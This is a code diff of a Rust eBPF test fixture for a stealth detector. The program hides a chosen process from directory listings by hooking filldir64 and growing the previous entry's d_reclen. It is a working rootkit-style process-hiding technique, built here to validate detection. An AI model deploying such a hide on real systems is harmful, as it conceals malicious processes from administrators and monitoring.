@@ -4,19 +4,32 @@
 //! The Z11 detonation fixture's BPF side (night-frontier-Z11, phase
 //! c, D8). NOT production code - a test fixture that lives only in
 //! the project's own CI micro-VM (the kernel-floor lane's 5.15
-//! kernel), planted for one purpose: prove the recorded-pid compare
-//! catches a real stealth mechanism instead of a mocked one.
+//! kernel) and the operator's own detonation run, planted for one
+//! purpose: prove the recorded-pid compare catches a real stealth
+//! mechanism instead of a mocked one.
 //!
 //! The mechanism it demonstrates is the classic directory-listing
-//! hide: a fexit program on `__x64_sys_getdents64` (the syscall
-//! wrapper the /proc readdir batch-reads through) that removes ONE
-//! pid's entry from the buffer the syscall is about to return. The
-//! hide is the `d_reclen` absorb: the PREVIOUS entry's record length
-//! grows to swallow the hidden entry, so the userspace iterator -
-//! which walks `offset += d_reclen` - lands past it and never sees
-//! the pid. No memmove, no retval rewrite: two bounded writes at
-//! most, every bound explicit, so the verifier accepts the program
-//! on the 5.15 floor.
+//! hide: an fentry program on `filldir64` - the per-entry callback
+//! every getdents64 call drives - that removes ONE pid's entry from
+//! the batch. The kernel hands the program the entry's own facts as
+//! arguments (the container cursor, the name, its length), so there
+//! is NO batch walk: the first shape walked the returned buffer
+//! entry by entry with a probe-read stride, and the verifier
+//! refused it on BOTH kernels the lanes run - the 5.15 floor died
+//! in the state-line flood that walked verification generated (the
+//! load's own log write failed, the verdict surfacing as EFAULT
+//! over a verification that never finished), and 6.18 blew the
+//! complexity limit outright (E2BIG). One parse per filldir call
+//! carries no loop over unknown strides, so the verifier converges
+//! on both.
+//!
+//! The hide is still the `d_reclen` absorb: the PREVIOUS entry's
+//! record length - the container's `prev_reclen`, read before the
+//! kernel writes this entry - grows to swallow the entry about to
+//! be written, so the userspace iterator - which walks
+//! `offset += d_reclen` - lands past it and never sees the pid. No
+//! memmove, no retval rewrite: one bounded write, every bound
+//! explicit.
 //!
 //! WHY A FIXTURE AND NOT A MOCK: a mocked listing would prove the
 //! renderer, not the detector. The camera must record the hidden
@@ -37,10 +50,10 @@
 #![no_main]
 
 use aya_ebpf::{
-    helpers::{bpf_probe_read_kernel_buf, bpf_probe_read_user_buf, bpf_probe_write_user},
-    macros::{fexit, map},
+    helpers::{bpf_probe_read_kernel_buf, bpf_probe_write_user},
+    macros::{fentry, map},
     maps::Array,
-    programs::FExitContext,
+    programs::FEntryContext,
 };
 
 /// The fixture's one control slot: the pid to hide (0 = inert). The
@@ -50,39 +63,39 @@ use aya_ebpf::{
 #[map(name = "targets")]
 static TARGETS: Array<u64> = Array::with_max_entries(1, 0);
 
-/// One dirent64 header the parser rides on: d_ino (8) at 0, d_off
-/// (8) at 8, d_reclen (2) at 16, d_type (1) at 18, d_name at 19.
+/// The `getdents_callback64` container's cursor field (`current_dir`,
+/// the user buffer position THIS entry is about to be written at):
+/// the dir_context the callback receives is the container's first
+/// field, so the container rides the context's slot 0 directly and
+/// the cursor sits at offset 8. The one 12-byte probe read spans the
+/// cursor (u64 @8) and the predecessor's record length
+/// (`prev_reclen`, i32 @16) in a single call. The layout is the
+/// getdents64 implementation's own, stable from the 5.15 floor
+/// through 6.x; a kernel that moved the fields fails the read or
+/// names itself in the absorb, never silently.
+const CONTAINER_CURSOR: usize = 8;
+/// The dirent64 header the absorb formula rides on: d_ino (8) at 0,
+/// d_off (8) at 8, d_reclen (2) at 16, d_type (1) at 18, d_name at
+/// 19 - the kernel's own `ALIGN(offsetof(linux_dirent64, d_name) +
+/// namlen + 1, 8)`.
 const DIRENT_HEADER: usize = 19;
-/// The x86-64 trap frame offset of si - the syscall's second real
-/// argument, the dirent buffer pointer. The frame layout is the
-/// ABI's own (r15 first, di at 112, orig_ax after di), and the floor
-/// lane is x86-64 only, so the offset is the ABI's constant.
-const PT_REGS_SI: usize = 104;
-/// The smallest legal d_reclen (header + one name byte + NUL).
-const MIN_RECLEN: usize = DIRENT_HEADER + 2;
-/// The walk's own bound: a 32 KiB getdents batch holds at most a
-/// couple hundred entries; 2048 is the honest ceiling past which the
-/// walk names itself done instead of spinning.
-const WALK_BOUND: usize = 2048;
-/// The name bytes one parse step may read (a pid's decimal form is
-/// at most ten digits; sixteen is generous).
-const NAME_READ: usize = 16;
+/// The name bytes one parse step may read: a pid's decimal form is
+/// at most seven digits at the default pid_max (4.2M); eight is
+/// generous, and the parse stops at the first non-digit anyway.
+const NAME_DIGITS_MAX: usize = 8;
 
-/// The fexit program on the getdents64 wrapper. The wrapper's own
-/// BTF declares ONE argument - the trap frame pointer - so the
-/// context's slot 0 is the frame and slot 1 is the return value the
-/// fexit trampoline appends after it (the v5.15 verifier's own
-/// btf_ctx_access FEXIT branch: the slot past a function's last
-/// declared argument is the return value's seat). The syscall's real
-/// arguments ride inside the frame (si is the dirent buffer, dx the
-/// batch bound) and are read through probe reads, never through
-/// context slots the wrapper does not declare - the 4-th-argument
-/// refusal the first floor run named is the wrapper's one-argument
-/// shape refusing the four-slot assumption.
-#[fexit(function = "__x64_sys_getdents64")]
-pub fn pidhide(ctx: FExitContext) -> i32 {
-    // The fixture contract: a refusal inside the walk is named by the
-    // loader's own diagnostics - the program returns 0 (observe
+/// The fentry program on the getdents64 callback. The callback's
+/// BTF declares six arguments - the container's dir_context, the
+/// name, its length, the d_off, the inode, and the type - and the
+/// program reads the first three: slot 0 is the container (its
+/// `ctx` field is the struct's own first member), slot 1 the name,
+/// slot 2 the length. The syscall's buffer facts ride inside the
+/// container and are read through kernel probe reads, never through
+/// context slots the callback does not declare.
+#[fentry(function = "filldir64")]
+pub fn pidhide(ctx: FEntryContext) -> i32 {
+    // The fixture contract: a refusal inside the parse is named by
+    // the loader's own diagnostics - the program returns 0 (observe
     // only), never an error the caller would surface.
     match try_pidhide(&ctx) {
         Ok(rc) => rc,
@@ -90,138 +103,103 @@ pub fn pidhide(ctx: FExitContext) -> i32 {
     }
 }
 
-/// The hide walk: parse the returned buffer's entry chain, find the
-/// one dirent whose name parses to the target pid, absorb it into
-/// its predecessor's record length. Returns 1 when a pid was hidden,
-/// 0 when the batch had nothing to hide - the loader prints which.
-fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
-    // SAFETY: the syscall wrapper's BTF declares one argument - the
-    // trap frame pointer - so the context slots the wrapper itself
-    // declares are slot 0 (the frame) and slot 1 (the fexit return
-    // value, the btf_ctx_access FEXIT branch's own shape). The
-    // syscall's real arguments ride inside the frame: si holds the
-    // dirent buffer the syscall is about to return, read through a
-    // kernel probe read (the frame is kernel memory), and the
-    // buffer's own bytes are user memory read through user probe
-    // reads. The entry chain's bounds keep the walk inside the
-    // returned batch, and the probe helpers are the uapi helpers
-    // aya-ebpf wraps. One block carries the whole walk - edition
-    // 2024 wants the unsafe ops explicit, and this is where they
-    // all live.
+/// The hide: parse the entry name's leading decimal digits, compare
+/// them to the target pid, and grow the predecessor's record length
+/// by the entry about to be written. Returns 1 when a pid was
+/// hidden, 0 when this entry had nothing to hide - the loader
+/// prints which.
+fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
+    // SAFETY: the callback's BTF declares the container pointer, the
+    // name, and the length as its first three arguments; the name is
+    // kernel memory (the dentry's own name) and the container rides
+    // the kernel stack, so both ride kernel probe reads. The one
+    // write lands in the user buffer the syscall is about to return,
+    // bounded by the u16 field the length lives in. One block
+    // carries the whole hide - edition 2024 wants the unsafe ops
+    // explicit, and this is where they all live.
     unsafe {
-    let regs: i64 = ctx.arg(0);
-    if regs == 0 {
-        return Ok(0);
-    }
-    let regs = regs as usize as *const u8;
-    let returned: i64 = ctx.arg(1);
-    if returned <= 0 {
-        return Ok(0);
-    }
-    let returned = returned as usize;
-    let mut word = [0u8; 8];
-    bpf_probe_read_kernel_buf(regs.add(PT_REGS_SI), &mut word).map_err(|_| 1i32)?;
-    let buffer: *const u8 = usize::from_le_bytes(word) as *const u8;
-    if buffer.is_null() {
-        return Ok(0);
-    }
+        let container: i64 = ctx.arg(0);
+        if container == 0 {
+            return Ok(0);
+        }
+        let namlen: i32 = ctx.arg(2);
+        if namlen < 1 {
+            return Ok(0);
+        }
+        let target = match TARGETS.get(0) {
+            Some(0) | None => return Ok(0),
+            // The target rides the slot's own u64 - the u32 truncation
+            // the first shape rode forces the 5.15 verifier's precision
+            // backtracking through a partially-tracked stack slot at the
+            // walk's door (the machine-named EFAULT at the walk's first
+            // step), and a pid fits the u64 compare exactly as well.
+            Some(pid) => *pid,
+        };
 
-    let target = match TARGETS.get(0) {
-        Some(0) | None => return Ok(0),
-        // The target rides the slot's own u64 - the u32 truncation
-        // the first shape rode forces the 5.15 verifier's precision
-        // backtracking through a partially-tracked stack slot at the
-        // walk's door (the machine-named EFAULT at the walk's first
-        // step), and a pid fits the u64 compare exactly as well.
-        Some(pid) => *pid,
-    };
-
-    // The entry chain: walk the user buffer through tiny probe reads
-    // (two bytes of reclen, sixteen bytes of name per step). The
-    // bounds are explicit: the chain stops at the returned byte count
-    // or the walk bound, whichever comes first.
-    let mut offset = 0usize;
-    let mut prev_offset = usize::MAX;
-    let mut hidden_at: Option<(usize, usize)> = None;
-    let mut steps = 0;
-    while offset + DIRENT_HEADER <= returned && steps < WALK_BOUND {
-        steps += 1;
-        let mut header = [0u8; 2];
-        bpf_probe_read_user_buf(
-            buffer.add(offset + 16),
-            &mut header,
+        // The container's own cursor: where this entry is about to be
+        // written, and the predecessor's record length. prev_reclen 0
+        // means this entry leads the batch - no predecessor to absorb
+        // into, the named skip (the loader's batch is large enough
+        // that the marker's entry practically never leads).
+        let mut head = [0u8; 12];
+        bpf_probe_read_kernel_buf(
+            (container as usize as *const u8).add(CONTAINER_CURSOR),
+            &mut head,
         )
         .map_err(|_| 1i32)?;
-        let reclen = u16::from_le_bytes(header) as usize;
-        if reclen < MIN_RECLEN || offset + reclen > returned {
-            break;
+        let cursor = u64::from_le_bytes(head[0..8].try_into().map_err(|_| 1i32)?) as usize;
+        let prev_reclen = u32::from_le_bytes(head[8..12].try_into().map_err(|_| 1i32)?) as usize;
+        if cursor == 0 || prev_reclen == 0 {
+            return Ok(0);
         }
-        let mut name = [0u8; NAME_READ];
-        bpf_probe_read_user_buf(
-            buffer.add(offset + DIRENT_HEADER),
-            &mut name,
-        )
-        .map_err(|_| 1i32)?;
-        if parse_pid(&name) == Some(target) {
-            hidden_at = Some((prev_offset, offset + reclen));
-            break;
+
+        // The name parse: the entry's leading decimal digits, one
+        // parse per filldir call - no batch walk, no unknown strides.
+        // A name that is not a decimal pid (the root's own "." / "..",
+        // the non-numeric files, the names of other directories'
+        // listings this callback also serves) reads as a mismatch.
+        let name_ptr: i64 = ctx.arg(1);
+        if name_ptr == 0 {
+            return Ok(0);
         }
-        prev_offset = offset;
-        offset += reclen;
-    }
-
-    let Some((prev, end)) = hidden_at else {
-        return Ok(0);
-    };
-    if prev == usize::MAX {
-        // The target led the batch: no predecessor to absorb into.
-        // The honest fixture answer is the named skip - the loader's
-        // batch is large enough that the marker's entry practically
-        // never leads, and a skipped hide prints as a skipped leg.
-        return Ok(0);
-    }
-    // The absorb: the previous entry's d_reclen grows by the hidden
-    // entry's length, so the userspace iterator (offset += d_reclen)
-    // lands past the hidden pid. One two-byte write into the user
-    // buffer the syscall is about to return - the fexit runs before
-    // the return lands, so the hide is in place before readdir sees
-    // the batch.
-    let mut grown = [0u8; 2];
-    bpf_probe_read_user_buf(buffer.add(prev + 16), &mut grown).map_err(|_| 1i32)?;
-    // The absorbed span: the previous entry's record must reach the
-    // hidden entry's end (end - prev), never past it, and never past
-    // the u16 field the length lives in.
-    if (end - prev) > u16::MAX as usize {
-        return Ok(0);
-    }
-    let value: u16 = (end - prev) as u16;
-    bpf_probe_write_user(buffer.add(prev + 16) as *mut u16, &value)
-        .map_err(|_| 1i32)?;
-    Ok(1)
-    }
-}
-
-/// Parse the dirent name's leading decimal digits into a pid. A name
-/// that is not a decimal pid (the root's own "." / "..", the
-/// non-numeric files) reads as None. The pid rides the u64 the
-/// control slot carries - no truncation in the compare.
-fn parse_pid(name: &[u8; NAME_READ]) -> Option<u64> {
-    let mut pid: u64 = 0;
-    let mut digits = 0;
-    for byte in name {
-        match byte {
-            0 => break,
-            b'0'..=b'9' => {
-                pid = pid.wrapping_mul(10).wrapping_add((byte - b'0') as u64);
-                digits += 1;
+        let mut name = [0u8; NAME_DIGITS_MAX];
+        bpf_probe_read_kernel_buf(name_ptr as usize as *const u8, &mut name)
+            .map_err(|_| 1i32)?;
+        let mut value: u64 = 0;
+        let mut digits = 0usize;
+        let mut index = 0usize;
+        while index < NAME_DIGITS_MAX {
+            let byte = name[index];
+            if byte < b'0' || byte > b'9' {
+                break;
             }
-            _ => break,
+            value = value.wrapping_mul(10).wrapping_add((byte - b'0') as u64);
+            digits += 1;
+            index += 1;
         }
-    }
-    if digits == 0 || digits > 10 {
-        None
-    } else {
-        Some(pid)
+        if digits == 0 || value != target {
+            return Ok(0);
+        }
+
+        // The absorb: the predecessor's d_reclen grows by the hidden
+        // entry's length - the kernel's own formula
+        // ALIGN(offsetof(linux_dirent64, d_name) + namlen + 1, 8) - so
+        // the userspace iterator (offset += d_reclen) lands past the
+        // hidden pid. One two-byte write into the user buffer, before
+        // the kernel writes this entry: the fentry runs first, so the
+        // hide is in place before the batch ever returns.
+        let reclen = (namlen as usize + DIRENT_HEADER + 1 + 7) & !7usize;
+        let grown = prev_reclen.wrapping_add(reclen);
+        if grown > u16::MAX as usize {
+            return Ok(0);
+        }
+        let value16: u16 = grown as u16;
+        bpf_probe_write_user(
+            (cursor - prev_reclen + 16) as *mut u16,
+            &value16,
+        )
+        .map_err(|_| 1i32)?;
+        Ok(1)
     }
 }
 
